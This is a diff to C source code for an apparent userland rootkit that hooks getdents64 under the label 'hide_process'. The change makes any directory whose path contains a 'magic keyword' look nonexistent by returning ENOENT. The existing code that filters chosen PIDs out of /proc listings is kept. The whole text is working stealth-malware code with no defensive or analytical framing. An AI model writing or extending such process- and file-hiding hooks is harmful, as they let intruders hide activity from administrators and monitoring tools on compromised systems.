@@ -169,8 +169,8 @@ ssize_t getdents64(int fd, void *dirp, size_t count) {
     ssize_t nread;
     long bpos;
     struct linux_dirent64 *d;
-    char proc_path[256];
     char fd_path[256];
+    char real_path[PATH_MAX];
     ssize_t len;
 
     DEBUG_PRINT("[hide_process] getdents64 called: fd=%d, count=%zu\n", fd, count);
@@ -187,6 +187,25 @@ ssize_t getdents64(int fd, void *dirp, size_t count) {
         DEBUG_PRINT("[hide_process] Successfully loaded original getdents64\n");
     }
 
+    // Resolve the directory path this fd points to
+    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);
+    len = readlink(fd_path, real_path, sizeof(real_path) - 1);
+
+    if (len > 0) {
+        real_path[len] = '\0';
+        DEBUG_PRINT("[hide_process] fd %d points to: %s\n", fd, real_path);
+
+        // Check if the ENTIRE path contains any magic keyword
+        if (contains_magic_keyword(real_path)) {
+            DEBUG_PRINT("[hide_process] *** Path '%s' contains magic keyword - FAILING entire getdents64 ***\n", real_path);
+            errno = ENOENT;  // "No such file or directory"
+            return -1;
+        }
+    } else {
+        DEBUG_PRINT("[hide_process] Can't determine directory path for fd %d: %s\n", fd, strerror(errno));
+        // Continue anyway - if we can't resolve it, we can't check it
+    }
+
     // Call the original getdents64
     nread = original_getdents64(fd, dirp, count);
 
@@ -201,27 +220,15 @@ ssize_t getdents64(int fd, void *dirp, size_t count) {
         return nread;
     }
 
-    // Check if this fd is reading from /proc
-    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);
-    len = readlink(fd_path, proc_path, sizeof(proc_path) - 1);
+    // Check if this fd is reading from /proc (for PID-specific filtering)
+    int is_proc = (len > 0 && strcmp(real_path, "/proc") == 0);
 
-    if (len <= 0) {
-        // Can't determine what directory this is, pass through unchanged
-        DEBUG_PRINT("[hide_process] Can't determine directory path for fd %d: %s\n", fd, strerror(errno));
-        return nread;
-    }
-
-    proc_path[len] = '\0';
-
-    DEBUG_PRINT("[hide_process] fd %d points to: %s\n", fd, proc_path);
-
-    // Only filter if we're reading /proc
-    if (strcmp(proc_path, "/proc") != 0) {
+    if (!is_proc) {
         DEBUG_PRINT("[hide_process] Not /proc, passing through unchanged\n");
         return nread;
     }
 
-    DEBUG_PRINT("[hide_process] *** Reading /proc - filtering entries ***\n");
+    DEBUG_PRINT("[hide_process] *** Reading /proc - filtering PID entries ***\n");
 
 #if DEBUG_MODE
     // Count entries before filtering
@@ -235,7 +242,7 @@ ssize_t getdents64(int fd, void *dirp, size_t count) {
     DEBUG_PRINT("[hide_process] Found %d directory entries\n", entry_count);
 #endif
 
-    // Filter the directory entries
+    // Filter the directory entries (only for /proc - hide matching PIDs)
     bpos = 0;
     int filtered_count = 0;
     while (bpos < nread) {
